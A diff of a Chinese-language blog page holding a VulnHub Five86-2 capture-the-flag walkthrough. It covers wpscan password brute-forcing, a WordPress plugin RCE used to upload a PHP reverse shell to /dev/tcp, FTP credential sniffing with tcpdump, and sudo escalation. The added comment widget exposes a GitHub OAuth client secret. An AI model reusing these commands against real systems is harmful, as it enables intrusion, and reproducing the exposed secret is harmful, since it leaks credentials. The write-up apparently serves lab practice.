@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[vulnhub]Five86-2靶机 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[vulnhub]Five86-2靶机 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[vulnhub]Five86-2靶机 |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[vulnhub]Five86-2靶机"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/vulnhubfive86-2-ba-ji/"/>
+    <meta property="og:url" content="http://localhost:4000/post/vulnhubfive86-2-ba-ji/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,7 +80,7 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">渗透测试</a>
+            <a href="http://localhost:4000/tag/EfzSPkBWE/" class="tag">渗透测试</a>
             
         </span>
             <h1>[vulnhub]Five86-2靶机</h1>
@@ -100,7 +100,7 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>开放了20,21,80端口<br>
-<img src="https://guokeya.github.io/post-images/1580876964974.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1580876964974.png" alt="" loading="lazy"></p>
 <!-- more -->
 <p>proftpd1.3.5有个远程代码执行。然而这里是1.3.5e<br>
 尝试匿名登陆。不行<br>
@@ -111,29 +111,29 @@ wpscan先获取下用户名<br>
 然后爆破用户名密码<br>
 <code>wpscan --url http://192.168.0.183/ -U /root/user.txt -P /usr/share/wordlists//rockyou.txt</code><br>
 得到两个用户名密码<br>
-<img src="https://guokeya.github.io/post-images/1580877082307.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580877082307.png" alt="" loading="lazy"><br>
 登陆后台。有三个插件<br>
-<img src="https://guokeya.github.io/post-images/1580877142874.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580877142874.png" alt="" loading="lazy"><br>
 第三个插件存在RCE<br>
 利用：<code>https://www.freebuf.com/vuls/205735.html</code><br>
 新建一个index.html和123.php<br>
 123.php是一句话木马<code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.183/8080 0&gt;&amp;1'&quot;);?&gt;</code><br>
 打包poc.zip<br>
-<img src="https://guokeya.github.io/post-images/1580877823514.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1580877859002.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1580877864346.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580877823514.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580877859002.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580877864346.png" alt="" loading="lazy"><br>
 <code>http://five86-2/wp-content/uploads/articulate_uploads/poc/123.php</code><br>
 查看进程。发现有个paul用户有个脚本跑ftp。看名字应该是自动上传。<br>
-<img src="https://guokeya.github.io/post-images/1580878048649.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580878048649.png" alt="" loading="lazy"><br>
 自动上传。就会有登陆FTP。用户名密码<br>
 尝试抓包。www用户没权限调用tcpdump<br>
 前面爆出两个用户名密码。尝试登陆下<br>
 PS:这里PHP反弹的shell就可以su。一句话木马的shell就不能，<br>
 <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code><br>
 tcpdump -D发现有多张网卡<br>
-<img src="https://guokeya.github.io/post-images/1580879487455.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580879487455.png" alt="" loading="lazy"><br>
 监听用户名密码<br>
-<img src="https://guokeya.github.io/post-images/1580880875800.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580880875800.png" alt="" loading="lazy"><br>
 可以以peter用户执行server</p>
 <pre><code>paul@five86-2:/tmp$ sudo -l
 sudo -l
@@ -157,11 +157,11 @@ User peter may run the following commands on five86-2:
 peter@five86-2:/$ 
 </code></pre>
 <p>直接passwd改密码<br>
-<img src="https://guokeya.github.io/post-images/1580881367945.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1580881367945.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/vulnhubfive86-1-ba-ji/">
+            <a href="http://localhost:4000/post/vulnhubfive86-1-ba-ji/">
               <span class="post-title">
                 [vulnhub]Five86-1靶机&rarr;
               </span>
@@ -170,6 +170,26 @@ peter@five86-2:/$
         
         <div class="comment">
           
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
         </div>
       </div>
     </div>
@@ -205,7 +225,7 @@ peter@five86-2:/$
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -213,17 +233,17 @@ peter@five86-2:/$
               </a>
               </li>
           </ul>
-          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
         </div>
       </div>
     </div>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
